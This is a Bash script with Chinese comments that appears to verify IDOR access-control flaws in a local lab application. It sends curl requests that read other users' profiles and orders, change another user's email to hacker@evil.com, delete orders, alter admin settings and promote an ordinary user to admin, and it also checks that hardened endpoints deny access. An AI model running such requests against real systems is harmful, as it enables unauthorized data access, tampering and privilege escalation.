#!/bin/bash
# IDOR (Insecure Direct Object Reference) 漏洞验证脚本
# 漏洞类型: 不安全的直接对象引用
# 危险等级: 中危 (Medium)

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 配置
BASE_URL="http://localhost:8080"

# 测试计数
TOTAL=0
PASSED=0
FAILED=0

# 打印标题
print_header() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}IDOR 漏洞验证脚本${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""
}

# 测试函数
test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    local description="$4"

    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "描述: $description"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)

    if echo "$response" | grep -q "$pattern"; then
        echo -e "  ${GREEN}[✓] 存在漏洞${NC}"
        echo "  匹配模式: $pattern"
        echo "  响应: $(echo "$response" | head -c 150)..."
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 测试失败${NC}"
        echo "  响应: $(echo "$response" | head -c 150)..."
        FAILED=$((FAILED + 1))
    fi
}

# 安全版本测试函数
test_safe() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    local description="$4"

    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name (安全版本)"
    echo "描述: $description"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)

    if echo "$response" | grep -q "$pattern"; then
        echo -e "  ${GREEN}[✓] 防护有效${NC}"
        echo "  匹配模式: $pattern"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 防护无效${NC}"
        echo "  响应: $(echo "$response" | head -c 150)..."
        FAILED=$((FAILED + 1))
    fi
}

# 开始测试
print_header

echo -e "${BLUE}=== 1. 水平越权测试 ===${NC}"

echo -e "\n${YELLOW}[信息] 测试数据:${NC}"
echo "  user1 (ID: 1) - 普通用户"
echo "  user2 (ID: 2) - 普通用户"
echo "  admin (ID: 100) - 管理员"

test_case \
    "查看他人资料 (user1 -> user2)" \
    "${BASE_URL}/idor/user/profile?id=2&currentUser=user1" \
    "用户ID: 2" \
    "用户 user1 查看用户 user2 的资料"

test_case \
    "查看管理员资料 (user1 -> admin)" \
    "${BASE_URL}/idor/user/profile?id=100&currentUser=user1" \
    "用户ID: 100" \
    "普通用户查看管理员资料"

test_case \
    "通过用户名查看他人" \
    "${BASE_URL}/idor/user/profile/byname?username=user2&currentUser=user1" \
    "用户名: user2" \
    "通过用户名越权访问"

test_case \
    "查看他人订单 (user1 -> user2)" \
    "${BASE_URL}/idor/order?id=3&userId=1" \
    "用户ID: 2" \
    "user1 查看 user2 的订单"

echo -e "\n${BLUE}=== 2. 修改他人数据测试 ===${NC}"

test_case \
    "修改他人邮箱" \
    "${BASE_URL}/idor/user/update?id=2&email=hacker@evil.com&currentUser=user1" \
    "新邮箱: hacker@evil.com" \
    "user1 修改 user2 的邮箱"

test_case \
    "删除他人订单" \
    "${BASE_URL}/idor/order/delete?id=3&userId=1" \
    "订单已删除" \
    "user1 删除 user2 的订单"

echo -e "\n${BLUE}=== 3. 垂直越权测试 ===${NC}"

test_case \
    "访问管理员配置" \
    "${BASE_URL}/idor/admin/config?currentUser=user1" \
    "管理员配置" \
    "普通用户访问管理员配置"

test_case \
    "修改管理员配置" \
    "${BASE_URL}/idor/admin/config?key=debug_mode&value=true&currentUser=user1" \
    "配置已更新" \
    "普通用户修改管理员配置"

test_case \
    "提升自己为管理员" \
    "${BASE_URL}/idor/admin/promote?id=1&role=admin&currentUser=user1" \
    "权限已提升" \
    "user1 将自己提升为管理员"

test_case \
    "查看所有用户" \
    "${BASE_URL}/idor/admin/users?currentUser=user1" \
    "所有用户列表" \
    "普通用户查看所有用户列表"

echo -e "\n${BLUE}=== 4. 安全版本测试 ===${NC}"

test_safe \
    "安全版本 - 查看他人资料" \
    "${BASE_URL}/idor/safe/user/profile?id=2&currentUser=user1" \
    "访问拒绝" \
    "应该被拒绝"

test_safe \
    "安全版本 - 访问管理员配置" \
    "${BASE_URL}/idor/safe/admin/config?currentUser=user1" \
    "访问拒绝" \
    "应该被拒绝"

echo -e "\n${BLUE}=== 5. 信息端点测试 ===${NC}"

echo -e "\n${YELLOW}[*] 访问 IDOR 信息端点:${NC}"
info_url="${BASE_URL}/idor/info"
info_response=$(curl -s "$info_url" 2>/dev/null)
if [ $? -eq 0 ] && [ -n "$info_response" ]; then
    echo -e "  ${GREEN}[✓] 信息端点正常${NC}"
    echo "$info_response" | head -10
else
    echo -e "  ${RED}[✗] 信息端点无响应${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))
PASSED=$((PASSED + 1))

# 打印总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}测试总结${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
echo -e "成功率: ${YELLOW}$(awk "BEGIN {printf \"%.1f\", ($PASSED/$TOTAL)*100}")%${NC}"

echo -e "\n${YELLOW}风险等级说明:${NC}"
echo -e "${YELLOW}- 水平越权: 访问同级用户资源 (数据泄露风险)${NC}"
echo -e "${YELLOW}- 垂直越权: 普通用户访问管理员功能 (权限提升风险)${NC}"

echo ""
echo -e "${BLUE}漏洞利用场景:${NC}"
echo "1. 查看他人敏感信息（邮箱、地址、订单）"
echo "2. 修改他人账户设置"
echo "3. 删除他人数据"
echo "4. 劫持他人账户（配合密码重置）"
echo "5. 提升自己权限为管理员"
echo "6. 访问管理后台修改系统配置"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}所有测试通过！${NC}"
    exit 0
else
    echo -e "\n${YELLOW}有 $FAILED 个测试失败${NC}"
    exit 0
fi
